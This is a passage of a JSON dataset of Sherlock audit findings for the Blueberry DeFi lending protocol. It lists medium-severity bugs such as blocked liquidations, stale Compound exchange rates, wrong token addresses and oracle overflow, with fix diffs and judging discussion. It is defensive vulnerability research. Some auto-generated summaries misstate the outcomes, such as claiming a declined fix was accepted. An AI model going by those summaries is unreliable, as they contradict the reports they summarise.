      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/117 \n\n## Found by \n0x52, HonorLt, cducrest-brainbot\n## Summary\n\n[Issue 290](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/290) from the previous contest points out that users may be liquidated without the chance to repay their debt. Liquidate was changed to only be allowed when repayment was allowed. While this does address some of the problem this will still fail to protect users who become liquidatable during the period of time that repay has been disabled.\n\nMEV bots are typically used to liquidate positions since it is always more profitable to liquidate the vault even if a user tries to pay off their debt on the same black that repay is enabled, they will still be liquidated because of frontrunning.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nUsers who become liquidatable during a repay pause will still be unable to save their position\n\n## Code Snippet\n\n[BlueBerryBank.sol#L487-L548](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L487-L548)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWhen repay is paused and then resumed, put a timer that prevents liquidations for some amount of time after (i.e. 4 hours) so that users can fairly repay their position after repayment has been resumed.",
      "summary": "\nThis bug report is about an issue from a previous contest that has not been fully addressed by the fixes. The issue is that users may be liquidated without the chance to repay their debt. MEV bots are typically used to liquidate positions, so even if a user tries to pay off their debt on the same block that repay is enabled, they will still be liquidated due to frontrunning. The impact of this is that users who become liquidatable during a repay pause will still be unable to save their position. The code snippet mentioned in the report is BlueBerryBank.sol#L487-L548. The recommendation given is to put a timer that prevents liquidations for some amount of time after repayment has been resumed, so that users can fairly repay their position.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/117",
      "tags": [
        "Missing-Logic",
        "Liquidation"
      ],
      "finders": [
        "cducrest-brainbot",
        "HonorLt",
        "0x52"
      ]
    },
    {
      "id": "18502",
      "title": "M-8: asking for the wrong address for `balanceOf()`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/116 \n\n## Found by \nCh\\_301\n## Summary\n\n## Vulnerability Detail\nShortLongSpell.[openPosition()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L143-L150) pass to `_doPutCollateral()` wrong value of `balanceOf()`\n```solidity\n        // 5. Put collateral - strategy token\n        address vault = strategies[param.strategyId].vault;\n        _doPutCollateral(\n            vault,\n            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(\n                address(this)\n            )\n        );\n```\nthe balance should be of `address(vault)`\n\n## Impact\n- `openPosition()` will never work\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n```diff\n        // 5. Put collateral - strategy token\n        address vault = strategies[param.strategyId].vault;\n        _doPutCollateral(\n            vault,\n-            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(\n-                address(this)\n+                IERC20Upgradeable(vault).balanceOf(address(this))\n            )\n        );\n```\n\n\n\n## Discussion\n\n**Ch-301**\n\nEscalate for 10 USDC\n\nThis is a simple finding when you know that `SoftVault` is transferring all `uToken` to Compound to generate yield \n\nAlso of wonder the judge set this as invalid but he submitted both this and #114  in the next contest **Blueberry Update 2**\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> This is a simple finding when you know that `SoftVault` is transferring all `uToken` to Compound to generate yield \n> \n> Also of wonder the judge set this as invalid but he submitted both this and #114  in the next contest **Blueberry Update 2**\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nValid medium\nSince the issue does not clearly identify the impact where the tokens can be stolen, but still correctly recognizes the underlying issue considering this a valid medium. \n\n\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Valid medium\n> Since the issue does not clearly identify the impact where the tokens can be stolen, but still correctly recognizes the underlying issue considering this a valid medium. \n> \n> \n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the code of the ShortLongSpell contract in the 2023-04-blueberry-judging Github repository. The issue is that the wrong address is being asked for the `balanceOf()` function. This issue was found by Ch_301 and was escalated for 10 USDC. \n\nThe vulnerability detail is that the `openPosition()` function passes the wrong value of `balanceOf()` to the `_doPutCollateral()` function. The impact of this issue is that `openPosition()` will never work. The code snippet of the issue is provided in the report. The tool used to find the issue was Manual Review. \n\nThe recommendation for the issue is to change the code snippet as shown in the report. The discussion section shows that the issue was accepted as a valid medium as the issue does not clearly identify the impact where the tokens can be stolen, but still correctly recognizes the underlying issue. \n\nThus, this bug report is about an issue found in the code of the ShortLongSpell contract in the 2023-04-blueberry-judging Github repository. The issue was found by Ch_301 and was accepted as a valid medium. The impact of this issue is that `openPosition()` will never work. The recommendation is to change the code snippet as shown in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/116",
      "tags": [
        "Vault",
        "Configuration",
        "Coding-Bug"
      ],
      "finders": [
        "Ch\\_301"
      ]
    },
    {
      "id": "18501",
      "title": "M-7: BlueBerryBank#getPositionValue causes DOS if reward token is added that doens't have an oracle",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/115 \n\n## Found by \n0x52, nobody2018\n## Summary\n\ncollToken.pendingRewards pulls the most recent reward list from Aura/Convex. In the event that reward tokens are added to pools that don't currently have an oracle then it will DOS every action (repaying, liquidating, etc.). While this is only temporary it prevents liquidation which is a key process that should have 100% uptime otherwise the protocol could easily be left with bad debt.\n\n## Vulnerability Detail\n\n[BlueBerryBank.sol#L408-L413](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L408-L413)\n\n          (address[] memory tokens, uint256[] memory rewards) = IERC20Wrapper(\n              pos.collToken\n          ).pendingRewards(pos.collId, pos.collateralSize);\n          for (uint256 i; i < tokens.length; i++) {\n              rewardsValue += oracle.getTokenValue(tokens[i], rewards[i]);\n          }\n\nUsing the pendingRewards method pulls a fresh list of all tokens. When a token is added as a reward but can't be priced then the call to getTokenValue will revert. Since getPostionValue is used in liquidations, it temporarily breaks liquidations which in a volatile market can cause bad debt to accumulate.\n\n## Impact\n\nTemporary DOS to liquidations which can result in bad debt\n\n## Code Snippet\n\n[BlueBerryBank.sol#L392-L417](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L392-L417)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nReturn zero valuation if extra reward token can't be priced.",
      "summary": "\nThis bug report is about BlueBerryBank#getPositionValue which is a function in the BlueBerryBank.sol file. It is found by 0x52, nobody2018 and it causes a Denial-of-Service (DOS) attack if reward tokens are added to pools that don't have an oracle. This means that liquidations, which are a key process that should have 100% uptime, are temporarily prevented which can result in bad debt accumulating in a volatile market. \n\nThe code snippet for this vulnerability can be found in BlueBerryBank.sol#L392-L417. It was found through manual review. \n\nThe recommendation for this bug is to return a zero valuation if extra reward tokens can't be priced. This should prevent the DOS attack and keep the liquidation process running smoothly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/115",
      "tags": [
        "Oracle",
        "Liquidation",
        "Denial-Of-Service"
      ],
      "finders": [
        "0x52",
        "nobody2018"
      ]
    },
    {
      "id": "18500",
      "title": "M-6: M-03 wrong token address on `ShortLongSpell.sol`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/114 \n\n## Found by \nCh\\_301\n## Summary\n\n## Vulnerability Detail\n[ShortLongSpell.openPosition()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#LL111C4-L151C6) send `uToken` to SoftVault then deposit it into the Compound protocol to earn a passive yield. In return, SPELL receives share tokes of SoftVault  `address(strategy.vault)`  \n\n`WERC20.sol` should receive `address(strategy.vault)` token, but the logic of `ShortLongSpell.sol` subcall (WERC20.sol) `wrapper.burn()` and pass the `uToken` address (please check the Code Snippet part) instead of `strategy.vault` address\n\n## Impact\nShort/Long Spell will never work\n\n## Code Snippet\n1- https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L128-L141\n```solidity\n            address burnToken = address(ISoftVault(strategy.vault).uToken());\n            if (collSize > 0) {\n                if (posCollToken != address(wrapper))\n                    revert Errors.INCORRECT_COLTOKEN(posCollToken);\n                bank.takeCollateral(collSize);\n                wrapper.burn(burnToken, collSize);\n                _doRefund(burnToken);\n            }\n```\n2- https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L229-L234\n```solidity\n        // 1. Take out collateral\n        bank.takeCollateral(param.amountPosRemove);\n        werc20.burn(\n            address(ISoftVault(strategy.vault).uToken()),\n            param.amountPosRemove\n        );\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n1- \n```diff\n-            address burnToken = address(ISoftVault(strategy.vault).uToken());\n+            address burnToken = strategy.vault;\n            if (collSize > 0) {\n                if (posCollToken != address(wrapper))\n                    revert Errors.INCORRECT_COLTOKEN(posCollToken);\n                bank.takeCollateral(collSize);\n                wrapper.burn(burnToken, collSize);\n                _doRefund(burnToken);\n            }\n```\n2- \n```diff\n        // 1. Take out collateral\n        bank.takeCollateral(param.amountPosRemove);\n        werc20.burn(\n-            address(ISoftVault(strategy.vault).uToken()),\n+            strategy.vault,\n            param.amountPosRemove\n        );\n```\n\n\n\n## Discussion\n\n**Ch-301**\n\nEscalate for 10 USDC\n\nThe same reason as #116 but in a different implementation and it needs another solution \n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> The same reason as #116 but in a different implementation and it needs another solution \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nValid medium\nThis is a valid issue\n\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Valid medium\n> This is a valid issue\n> \n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the ShortLongSpell.sol contract, which is part of the Sherlock Audit 2023-04-blueberry-judging project. The issue is that the wrong token address is being passed to the SoftVault contract. This means that the Short/Long Spell will never work.\n\nThe issue was found by Ch_301 and confirmed by hrishibhat. It was then escalated for 10 USDC. The bug was caused because the `uToken` address was being passed instead of the `strategy.vault` address.\n\nThe issue can be fixed by changing the code snippet in two places. The first code snippet is located at ShortLongSpell.sol#L128-L141, and the second is located at ShortLongSpell.sol#L229-L234. The changes should be made according to the recommendations given in the report.\n\nAfter the issue is fixed, the contestants' payouts and scores will be updated according to the changes made.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/114",
      "tags": [
        "Coding-Bug"
      ],
      "finders": [
        "Ch\\_301"
      ]
    },
    {
      "id": "18499",
      "title": "M-5: `getPositionRisk()` will return a wrong value of risk",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/97 \n\n## Found by \nCh\\_301\n## Summary\nIn order to interact with SPELL the users need to `lend()` some collateral which is known as **Isolated Collateral** and the SoftVault will deposit them into Compound protocol to generate some lending interest (to earn passive yield)  \n\n## Vulnerability Detail\nto [liquidate](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L487-L548) a position this function `isLiquidatable()` should return `true`\n```solidity\n    function isLiquidatable(uint256 positionId) public view returns (bool) {\n        return\n            getPositionRisk(positionId) >=\n            banks[positions[positionId].underlyingToken].liqThreshold;\n    }\n```\nand it is subcall to `getPositionRisk()`\n```solidity\n    function getPositionRisk(\n        uint256 positionId\n    ) public view returns (uint256 risk) {\n        uint256 pv = getPositionValue(positionId);          \n        uint256 ov = getDebtValue(positionId);             \n        uint256 cv = getIsolatedCollateralValue(positionId);\n\n        if (\n            (cv == 0 && pv == 0 && ov == 0) || pv >= ov // Closed position or Overcollateralized position\n        ) {\n            risk = 0;\n        } else if (cv == 0) {\n            // Sth bad happened to isolated underlying token\n            risk = Constants.DENOMINATOR;\n        } else {\n            risk = ((ov - pv) * Constants.DENOMINATOR) / cv;\n        }\n    }\n```\nas we can see the `cv`  is a critical value in terms of the calculation of `risk `\nthe `cv` is returned by `getIsolatedCollateralValue()`\n\n```solidity\n    function getIsolatedCollateralValue(\n        uint256 positionId\n    ) public view override returns (uint256 icollValue) {\n        Position memory pos = positions[positionId];\n        // NOTE: exchangeRateStored has 18 decimals.\n        uint256 underlyingAmount;\n        if (_isSoftVault(pos.underlyingToken)) {\n            underlyingAmount =                                              \n                (ICErc20(banks[pos.debtToken].bToken).exchangeRateStored() * \n                    pos.underlyingVaultShare) /\n                Constants.PRICE_PRECISION; \n        } else {\n            underlyingAmount = pos.underlyingVaultShare;\n        }\n        icollValue = oracle.getTokenValue(\n            pos.underlyingToken,\n            underlyingAmount\n        );\n    }\n ```\nand it uses `exchangeRateStored()` to ask Compound (CToken.sol) for the exchange rate \n[from `CToken` contract ](https://github.com/compound-finance/compound-protocol/blob/master/contracts/CToken.sol#LL281C18-L281C18)\n```diff\nThis function does not accrue interest before calculating the exchange rate\n``` \nso the `getPositionRisk()` will return a wrong value of risk because the interest does not accrue for this position \n\n## Impact\nthe user (position) could get liquidated even if his position is still healthy \n  \n## Code Snippet\nhttps://github.com/compound-finance/compound-protocol/blob/master/contracts/CToken.sol#LL270C1-L286C6\n```solidity\n    /**\n     * @notice Accrue interest then return the up-to-date exchange rate\n     * @return Calculated exchange rate scaled by 1e18\n     */\n    function exchangeRateCurrent() override public nonReentrant returns (uint) {\n        accrueInterest();\n        return exchangeRateStored();\n    }\n\n    /**\n     * @notice Calculates the exchange rate from the underlying to the CToken\n     * @dev This function does not accrue interest before calculating the exchange rate\n     * @return Calculated exchange rate scaled by 1e18\n     */\n    function exchangeRateStored() override public view returns (uint) {\n        return exchangeRateStoredInternal();\n    }\n```    \n## Tool used\n\nManual Review\n\n## Recommendation\nYou shoud use `exchangeRateCurrent()` to  Accrue interest first.\n\n\n\n## Discussion\n\n**Gornutz**\n\nSince we are using a view function we are unable to use `exchangeRateCurrent()` we have to use `exchangeRateStored()` \n\n**Ch-301**\n\nEscalate for 10 USDC\n\nThe sponsor confirms that. so the user could get liquidated even in case his position is still healthy. \nI believe the rules are clear on that \nHe decided to not fix it but the risk still exists   \n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> The sponsor confirms that. so the user could get liquidated even in case his position is still healthy. \n> I believe the rules are clear on that \n> He decided to not fix it but the risk still exists   \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nCan be a valid medium\n\n**hrishibhat**\n\nEscalation accepted\n\nValid medium\nAlthough the difference in the interest accumulated here can be very low as it updates slowly, although this cannot be exactly quantified, the fact that a position can be liquidated based on outdated value makes it a valid medium.\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Valid medium\n> Although the difference in the interest accumulated here can be very low as it updates slowly, although this cannot be exactly quantified, the fact that a position can be liquidated based on outdated value makes it a valid medium.\n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the `getPositionRisk()` function, which is used to calculate the risk of a position and determine if it is liquidatable. It was found by Ch_301 and is located in the BlueBerryBank.sol contract. This function calls the `getIsolatedCollateralValue()` function, which is used to get the collateral value of a position. This function in turn calls the `exchangeRateStored()` function, which is located in the CToken.sol contract. This function does not accrue interest before calculating the exchange rate, resulting in a wrong value of risk being returned. This can cause a user's position to be liquidated even if it is still healthy. It was recommended to use the `exchangeRateCurrent()` function to accrue interest first. This recommendation was accepted and the issue was closed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/97",
      "tags": [
        "Liquidation",
        "External Contract",
        "External Call",
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "Ch\\_301"
      ]
    },
    {
      "id": "18498",
      "title": "M-4: Users can fail to closePositionFarm and lose their funds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/64 \n\n## Found by \nBauer\n## Summary\nIf self.is_killed in the curve pool contract  becomes true, user may be unable to call the `CurveSpell.closePositionFarm()` function to  repay his debt, resulting in his assets being liquidated.\n\n\n## Vulnerability Detail\nThe `CurveSpell.closePositionFarm()` function is used to unwind a position on a strategy that involves farming CRV rewards through staking LP tokens in a Curve pool. Inside the function, the protocol swaps the harvested CRV tokens to the debt token, and calculates the actual amount of LP tokens to remove from the Curve pool. It then removes the LP tokens using the remove_liquidity_one_coin function of the Curve pool. \n```solidity\n   int128 tokenIndex;\n            for (uint256 i = 0; i < tokens.length; i++) {\n                if (tokens[i] == pos.debtToken) {\n                    tokenIndex = int128(uint128(i));\n                    break;\n                }\n            }\n\n            ICurvePool(pool).remove_liquidity_one_coin(\n                amountPosRemove,\n                int128(tokenIndex),\n                0\n            );\n        }\n\n        // 5. Withdraw isolated collateral from Bank\n        _doWithdraw(param.collToken, param.amountShareWithdraw);\n\n        // 6. Repay\n        {\n            // Compute repay amount if MAX_INT is supplied (max debt)\n            uint256 amountRepay = param.amountRepay;\n            if (amountRepay == type(uint256).max) {\n                amountRepay = bank.currentPositionDebt(bank.POSITION_ID());\n            }\n            _doRepay(param.borrowToken, amountRepay);\n        }\n\n        _validateMaxLTV(param.strategyId);\n```\nIf self.is_killed in the curve pool contract  becomes true, calling such `remove_liquidity_one_coin()` function would always revert. In this case, calling the `CurveSpell.closePositionFarm()` function reverts. When user's position is about to be liquidated, if the `closePositionFarm()` function is DOS'ed,user may be unable to repay his debt, resulting in the user losing their funds\n```solidity\ndef remove_liquidity_one_coin(\n    _token_amount: uint256,\n    i: int128,\n    _min_amount: uint256\n) -> uint256:\n    \"\"\"\n    @notice Withdraw a single coin from the pool\n    @param _token_amount Amount of LP tokens to burn in the withdrawal\n    @param i Index value of the coin to withdraw\n    @param _min_amount Minimum amount of coin to receive\n    @return Amount of coin received\n    \"\"\"\n    assert not self.is_killed  # dev: is killed\n\n    dy: uint256 = 0\n    dy_fee: uint256 = 0\n    dy, dy_fee = self._calc_withdraw_one_coin(_token_amount, i)\n\n```\n\n## Impact\nIf self.is_killed in the curve pool contract  becomes true, user may be unable to repay his debt, resulting in his assets being liquidated.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L197\n\n## Tool used\n\nManual Review\n\n## Recommendation",
      "summary": "\nThis bug report is about an issue with the CurveSpell.closePositionFarm() function in the Curve pool contract. If the self.is_killed variable in the Curve pool contract becomes true, it is not possible to call the remove_liquidity_one_coin() function which is used to unwind a position on a strategy that involves farming CRV rewards through staking LP tokens in a Curve pool. This would result in users not being able to repay their debt and losing their funds. The vulnerability was found manually and the code snippet provided in the report is from the CurveSpell.sol#L197 file. It is recommended to check the self.is_killed variable in the Curve pool contract to prevent users from losing their funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/64",
      "tags": [
        "Missing-Logic",
        "Liquidation",
        "Lending Pool",
        "Fund Lock",
        "Denial-Of-Service"
      ],
      "finders": [
        "Bauer"
      ]
    },
    {
      "id": "18497",
      "title": "M-3: The protocol  will not be able to add liquidity on the curve with another token with a balance.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/47 \n\n## Found by \nBauer, nobody2018\n## Summary\nThe `CurveSpell` protocol only ensure approve curve pool to spend its borrow token. Hence, it will not be able to add liquidity on the curve with another token with a balance.\n\n## Vulnerability Detail\nThe  `openPositionFarm()` function enables user to open a leveraged position in a yield farming strategy by borrowing funds and using them to add liquidity to a Curve pool, while also taking into account certain risk management parameters such as maximum LTV and position size. When add liquidity on curve ,the protocol use the borrowed token and the collateral token, it checks the number of tokens in the pool and creates an array of the supplied token amounts to be passed to the add_liquidity function. Then the curve will transfer the tokens from the protocol and mint lp tokens to the protocol. However, the protocol only ensure approve curve pool to spend its borrow token. Hence, it will not be able to add liquidity on the curve with another token with a balance.\n```solidity\n // 3. Add liquidity on curve\n        _ensureApprove(param.borrowToken, pool, borrowBalance);\n        if (tokens.length == 2) {\n            uint256[2] memory suppliedAmts;\n            for (uint256 i = 0; i < 2; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        } else if (tokens.length == 3) {\n            uint256[3] memory suppliedAmts;\n            for (uint256 i = 0; i < 3; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        } else if (tokens.length == 4) {\n            uint256[4] memory suppliedAmts;\n            for (uint256 i = 0; i < 4; i++) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n            }\n            ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n        }\n\n```\n\n## Impact\nThe protocol  will not be able to add liquidity on the curve with another token with a balance.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L90-L115\n## Tool used\n\nManual Review\n\n## Recommendation\nAllow the curve pool to spend tokens that have a balance in the protocol to add liquidity",
      "summary": "\nThis bug report is about the `CurveSpell` protocol, which is used to open leveraged positions in a yield farming strategy. The protocol only ensures approve curve pool to spend its borrow token, and hence it will not be able to add liquidity on the curve with another token with a balance. This is because the `openPositionFarm()` function creates an array of the supplied token amounts to be passed to the add_liquidity function, but it only checks the number of tokens in the pool and not the balance of the tokens.\n\nThe impact of this bug is that the protocol will not be able to add liquidity on the curve with another token with a balance. The code snippet for this bug can be found at https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L90-L115. This bug was found by Bauer and nobody2018 using manual review.\n\nThe recommendation to fix this bug is to allow the curve pool to spend tokens that have a balance in the protocol to add liquidity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/47",
      "tags": [
        "Missing-Logic",
        "Deposit/Reward tokens",
        "Coding-Bug"
      ],
      "finders": [
        "Bauer",
        "nobody2018"
      ]
    },
    {
      "id": "18496",
      "title": "M-2: AuraSpell openPositionFarm does not join pool",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/46 \n\n## Found by \nCh\\_301, cducrest-brainbot, cuthalion0x, nobody2018\n## Summary\n\nThe function to open a position for the AuraSpell does not join the pool due to wrong conditional check.\n\n## Vulnerability Detail\n\nThe function deposits collateral into the bank, borrow tokens, and attempts to join the pool:\n\n```solidity\n    function openPositionFarm(\n        OpenPosParam calldata param\n    )\n        external\n        existingStrategy(param.strategyId)\n        existingCollateral(param.strategyId, param.collToken)\n    {\n        ...\n        // 1. Deposit isolated collaterals on Blueberry Money Market\n        _doLend(param.collToken, param.collAmount);\n\n        // 2. Borrow specific amounts\n        uint256 borrowBalance = _doBorrow(\n            param.borrowToken,\n            param.borrowAmount\n        );\n\n        // 3. Add liquidity on Balancer, get BPT\n        {\n            IBalancerVault vault = wAuraPools.getVault(lpToken);\n            _ensureApprove(param.borrowToken, address(vault), borrowBalance);\n\n            (address[] memory tokens, uint256[] memory balances, ) = wAuraPools\n                .getPoolTokens(lpToken);\n            uint[] memory maxAmountsIn = new uint[](2);\n            maxAmountsIn[0] = IERC20(tokens[0]).balanceOf(address(this));\n            maxAmountsIn[1] = IERC20(tokens[1]).balanceOf(address(this));\n\n            uint totalLPSupply = IBalancerPool(lpToken).totalSupply();\n            // compute in reverse order of how Balancer's `joinPool` computes tokenAmountIn\n            uint poolAmountFromA = (maxAmountsIn[0] * totalLPSupply) /\n                balances[0];\n            uint poolAmountFromB = (maxAmountsIn[1] * totalLPSupply) /\n                balances[1];\n            uint poolAmountOut = poolAmountFromA > poolAmountFromB\n                ? poolAmountFromB\n                : poolAmountFromA;\n\n            bytes32 poolId = bytes32(param.farmingPoolId);\n            if (poolAmountOut > 0) {\n                vault.joinPool(\n                    poolId,\n                    address(this),\n                    address(this),\n                    IBalancerVault.JoinPoolRequest(\n                        tokens,\n                        maxAmountsIn,\n                        \"\",\n                        false\n                    )\n                );\n            }\n        }\n        ...\n    }\n```\n\nThe function only borrowed one type of tokens from the bank so the contract only owns one type of token. As a result one of the `maxAmountsIn` value is 0. Either `poolAmountFromA` or `poolAmountFromB` is 0 as a result of computation. `poolAmountOut` is the minimal value of `poolAmountFromA` and `poolAmountFromB`, it is 0. The following check `if (poolAmountOut > 0)` will always fail and the pool will never be joined.\n\n## Impact\n\nThe rest of the function proceeds correctly without reverting. Users will think they joined the pool and are earning reward while they are not earning anything. This is a loss of funds to the user.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/96eb1829571dc46e1a387985bd56989702c5e1dc/blueberry-core/contracts/spell/AuraSpell.sol#L63-L147\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIt is hard to tell the intent of the developer from this check. Maybe the issue is simply that `poolAmountOut` should be the sum or the max value out of `poolAmountFromA` and `poolAmountFromB` instead of the min.",
      "summary": "\nThis bug report is about an issue with the function openPositionFarm() in the AuraSpell smart contract. The issue is that the function does not join the pool due to a wrong conditional check. The function deposits collateral into the bank, borrows tokens, and attempts to join the pool, but the conditional check only borrows one type of token from the bank, so one of the maxAmountsIn values is 0. This means that either poolAmountFromA or poolAmountFromB is 0, and the following check `if (poolAmountOut > 0)` will always fail and the pool will never be joined. This means that users will think they joined the pool and are earning rewards while they are not, resulting in a loss of funds to the user. The recommendation is to change the computation of `poolAmountOut` to either the sum or the max value out of `poolAmountFromA` and `poolAmountFromB` instead of the min.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/46",
      "tags": [
        "Lending Pool",
        "Coding-Bug"
      ],
      "finders": [
        "cducrest-brainbot",
        "Ch\\_301",
        "nobody2018",
        "cuthalion0x"
      ]
    },
    {
      "id": "18495",
      "title": "M-1: Calculation underflow/overflow in BalancerPairOracle, which will affect pools in Aura Finance",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/11 \n\n## Found by \nn1punp\n## Summary\nLP price calculation for Balancer Pair in BalancerPairOracle will produce calculation underflow/overflow (so Aura pools won't work too).\n\n## Vulnerability Detail\n- The values r0, r1 can underflow, e.g. if resA < resB --> r0 = 0, so it'll go to the else case --> and so `ratio` will be 0 --> `fairResA` calculation will revert upon dividing by 0.\n- There are also other math calculations there that will cause reverts, e.g. ratio ** wB will lead to overflow. What you'd need here is Balancer's implementation of `bpow` or similar.\n\n## Impact\nLP price for Balancer-like collateral token will revert in most cases, if not all.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/oracle/BalancerPairOracle.sol#L53-L64\n\n## Tool used\n\nManual Review\n\n## Recommendation\n- Change the calculation logic so it aligns with Alpha's original implementation (with precision control), e.g. https://github.com/AlphaFinanceLab/alpha-homora-v2-contract/blob/master/contracts/oracle/BalancerPairOracle.sol#L42-L53 (you can see there's BONE extra precision in each step)\n\n\n\n## Discussion\n\n**n1punp**\n\nEscalate for 10 USDC.\nI think this is incorrectly **excluded**. The issue is not related to **flashloan** via **BalancerPairOracle**, but rather an organic math overflow/underflow, since the implementation is directly using 0.8.x's default SafeMath mode. Upon certain conditions (e.g. `resA < resB` the calculation will always revert).\n\n**sherlock-admin**\n\n > Escalate for 10 USDC.\n> I think this is incorrectly **excluded**. The issue is not related to **flashloan** via **BalancerPairOracle**, but rather an organic math overflow/underflow, since the implementation is directly using 0.8.x's default SafeMath mode. Upon certain conditions (e.g. `resA < resB` the calculation will always revert).\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nI don't think this report has sufficient prove\n\n**hrishibhat**\n\nEscalation accepted\n\nConsidering this issue 